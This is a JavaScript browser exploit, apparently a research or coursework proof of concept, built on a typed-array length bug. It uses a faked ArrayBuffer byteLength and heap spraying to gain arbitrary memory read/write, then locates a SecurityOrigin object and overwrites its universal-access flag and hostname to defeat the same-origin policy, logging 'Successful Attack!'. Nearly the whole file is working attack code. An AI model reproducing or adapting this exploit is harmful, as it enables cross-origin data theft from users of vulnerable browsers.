function hex(a) {
	if (a == undefined) return "0xUNDEFINED";
	if (a < 0) a = 0xFFFFFFFF + a + 1;
	var ret_tmp = a.toString(16);
	var ret = ("00000000" + ret_tmp).substring(ret_tmp.length, 8 + ret_tmp.length);
	if (ret.substr(0,2) != "0x") return "0x"+ret;
	else return ret;
}

function log(s) {
	var log = document.getElementById("log");
	var ele = document.createElement("span");
	console.log(s);
	ele.innerHTML = s;
	log.appendChild(ele);
	log.appendChild(document.createElement("br"));
}
function read32(addr)
{
	var diff = addr - base;
	var index = diff/4;
	return faulty_arr[index];
}

function write32(addr, value)
{
	diff = addr - base;
	index = diff/4;
	faulty_arr[index] = value;
}

function exploit()
{
	faulty_arr_buf = new ArrayBuffer(0x10);
	faulty_arr_buf.__defineGetter__("byteLength", function() { return 0xFFFFFFFC; });
	faulty_arr = new Uint32Array(faulty_arr_buf);

	spray_array = new Array(0x1000);
	elements = new Array(0x250);
	for (var i = 0 ; i < spray_array.length ; i++) 
	{
		if (i == 0x500)
		{
			attribute_string1 = unescape("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");
			attribute_string = unescape("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa");
		}
		spray_array[i] = new Uint32Array(0x1000/4);
		for (var j = 0; j < spray_array[i].length; j++ )
		{
			spray_array[i][j] = 0x41414141;
		}
	}
	for (var i = 0 ; i < elements.length ; i++) 
	{
		elements[i] = document.createElement("div");
		for (var j = 0 ; j < 0x100 ; j ++)
		{
			elements[i].setAttribute("elem" + j,
					attribute_string);
		}
	}
	var address_list = {};
	for (var i = 0 ; i < 0x20000 ; i++)
	{
		addr = 0x200000 + 0x80000;
		addr = 0x200000 + 0x1f8;
		addr = 0x100000 - 0x60000;
		if ((faulty_arr[(addr - 0x1f8)/4 + i].toString(16) in address_list) == false)
		{
			address_list[faulty_arr[(addr -	0x1f8)/4 + i].toString(16)] = 0;
		}
		address_list[faulty_arr[(addr - 0x1f8)/4 + i].toString(16)] += 1;
	}
	max_val = 0;
	max_key = NaN;
	for (var key in address_list)
	{
		if (address_list[key] > max_val)
		{
			if (key!="0")
			{
				max_val = address_list[key];
				max_key = key
			}
		}
	}
	min_val = 0;
	min_key = 0;
	for (var i = 0 ; i < 0x20000 ; i++)
	{
		//addr = 0x001f8
		addr = 0x200000 + 0x40000;
		addr = 0x200000 + 0x001f8;
		addr = 0x100000 - 0x60000;
		if ((faulty_arr[(addr - 0x1f8)/4 + i].toString(16))==max_key)
		{
			if (min_val ==0)
			{
				min_val = faulty_arr[(addr - 0x1f8)/4 + i -1];
			}
			if (min_val < faulty_arr[(addr - 0x1f8)/4 + i -1])
			{
				min_val = faulty_arr[(addr - 0x1f8)/4 + i -1];
			}
		}
	}
	log ("max_heap:" + hex(min_val));

	var string_address = parseInt("0x" + max_key);
	var string_start_index = 0;
	/* scan for the relative offset of the string (i is the amount of
	 * dwords forward) */
	for (i = 0 ; i < 0xFFFFFFFC/4 ; i++)
	{
		if (faulty_arr[i] == 0x61616161)
		{   
			string_start_index = i;
			break;
		}
	}
	/* Now use the absolute string address to calculate the absolute
	 * address of our buffer */
	base = string_address - string_start_index*4 + 12;
	log("buffer:" + hex(base));
	log("-- string:" + hex(string_address));
	log("-- offset:" + hex(string_start_index*4));

	var xxx = 0;
	min_key = min_val;
	comp_flag = 0;

	if (min_key == 0)
	{
		log("exploit error!");
		return 0;
	}
	if (string_address == 0)
	{
		log("exploit error!");
		return 0;
	}
}

function search_origin()
{
	for (qqq=0; comp_flag < 1; qqq++)
	{
		var heap_base = min_key - qqq;
		if (read32(heap_base) == 0x1 || read32(heap_base) == 0x2) // reference number 
		{
			var m_host = read32(heap_base + 2 * 4 );
			var m_domain = read32(heap_base + 3 * 4);
			if (m_host == m_domain && m_host != 0)
			{
				var m_filePath = read32(heap_base + 4 * 4);
				var m_port_isUnique_universalAccess = read32(heap_base + 5 * 4);
				var m_dWSID_cLLR_eFPS_nDIQFF = read32(heap_base + 6 * 4);
				if (m_filePath == m_dWSID_cLLR_eFPS_nDIQFF
						&& m_dWSID_cLLR_eFPS_nDIQFF == 0x0
						&& m_port_isUnique_universalAccess == 0x00010000)
				{
					var unknown = read32(heap_base + 7 * 4);
					{
						protocol_addr = read32(heap_base + 1 * 4);
						hostname_addr = read32(heap_base + 3 * 4);

						// read length, if it is 19, we know it is
						// "www.comp.nus.edu.sg", we'll change this to
						// "www.google.com.sg"

						hostname_len = read32(hostname_addr + 0x4);
						log('found pattern len:'+ hex(heap_base) + ":" + hex(hostname_len));
						if (hostname_len == 0) 
						if (unknown == 0x1c) 
						{
							log('found comp security origin');
							log('parent:' + hex (heap_base));
							log("comp_flag: " + hex(comp_flag));
							write32(heap_base + 5 * 4, 0x01000000);
							protocol_len = read32(protocol_addr + 0x4);
							comp_flag++;
							// this is the comp security origin
							// write the length of protocol
							
							// No need to change the protocol
							//write32(protocol_addr + 0x4, 0x5);
							// write protocol "https"
							// original is "http" so we +4 and add "s"
							//write32(protocol_addr + 0xc + 0x4, 0x00000073);

							// write the length of hostname
							// sizeof("www.google.com.sg") is 0x11
							write32(hostname_addr + 0x4, 0x11);
							// write the hostname "www.google.com.sg"
							// skip "www."
							write32(hostname_addr + 0xc + 4*1, 0x676f6f67);
							write32(hostname_addr + 0xc + 4*2, 0x632e656c);
							write32(hostname_addr + 0xc + 4*3, 0x732e6d6f);
							write32(hostname_addr + 0xc + 4*4, 0xababab67);

							//write32(hostname_addr + 0xc + 4*0, 0x79616c70);
							//write32(hostname_addr + 0xc + 4*1, 0x6f6f672e);
							//write32(hostname_addr + 0xc + 4*2, 0x2e656c67);
							//write32(hostname_addr + 0xc + 4*3, 0x006d6f63);
						}
					}
				}
			}
		}
	}

	log('Successful Attack!');
	//setTimeout(function(){document.getElementById('prep').contentDocument.getElementById('bad-dropbox').click();}, 2000);
}

function search()
{
	for (qqq=0; comp_flag < 1; qqq++)
	{
		var heap_base = min_key - qqq;
		if (read32(heap_base) == 0x1 || read32(heap_base) == 0x2) // reference number 
		{
			var m_host = read32(heap_base + 2 * 4 );
			var m_domain = read32(heap_base + 3 * 4);
			if (m_host == m_domain && m_host != 0)
			{
				var m_filePath = read32(heap_base + 4 * 4);
				var m_port_isUnique_universalAccess = read32(heap_base + 5 * 4);
				var m_dWSID_cLLR_eFPS_nDIQFF = read32(heap_base + 6 * 4);
				if (m_filePath == m_dWSID_cLLR_eFPS_nDIQFF
						&& m_dWSID_cLLR_eFPS_nDIQFF == 0x0
						&& m_port_isUnique_universalAccess == 0x00010000)
				{
					var unknown = read32(heap_base + 7 * 4);
					{
						protocol_addr = read32(heap_base + 1 * 4);
						hostname_addr = read32(heap_base + 3 * 4);

						// read length, if it is 19, we know it is
						// "www.comp.nus.edu.sg", we'll change this to
						// "www.google.com.sg"

						hostname_len = read32(hostname_addr + 0x4);
						log('found pattern len:'+ hex(heap_base) + ":" + hex(hostname_len));
						if (hostname_len == 0) 
						if (unknown == 0x1c) 
						{
							// this is the comp security origin
							log('found comp security origin');
							write32(heap_base + 5 * 4, 0xff000000);
							log('parent:' + hex (heap_base));
							log("comp_flag: " + hex(comp_flag));

							write32(heap_base + 5 * 4, 0x01000000);
							protocol_len = read32(protocol_addr + 0x4);
							comp_flag++;
							// write the length of protocol
							/*
							   write32(protocol_addr + 0x4, 0x5);
							// write protocol "https"
							// original is "http" so we +4 and add "s"
							write32(protocol_addr + 0xc + 0x4, 0x00000073);

							// write the length of hostname
							//write32(hostname_addr + 0x4, 14);
							//write32(hostname_addr + 0x4, 17);
							write32(hostname_addr + 0x4, 15);
							// write the hostname "www.google.com.sg"
							// skip "www."
							write32(hostname_addr + 0xc + 4*1, 0x676f6f67);
							write32(hostname_addr + 0xc + 4*2, 0x632e656c);
							write32(hostname_addr + 0xc + 4*3, 0x732e6d6f);
							write32(hostname_addr + 0xc + 4*4, 0xababab67);

							write32(hostname_addr + 0xc + 4*0, 0x79616c70);
							write32(hostname_addr + 0xc + 4*1, 0x6f6f672e);
							write32(hostname_addr + 0xc + 4*2, 0x2e656c67);
							write32(hostname_addr + 0xc + 4*3, 0x006d6f63);
							 */
							//write32(hostname_addr + 0xc + 4*3, 0xabab6d6f);
							//write32(hostname_addr + 0xc + 4*4, 0xababab67);
						}
					}
				}
			}
		}
	}

	log('Successful Attack!');
	//setTimeout(function(){document.getElementById('prep').contentDocument.getElementById('bad-dropbox').click();}, 2000);
}
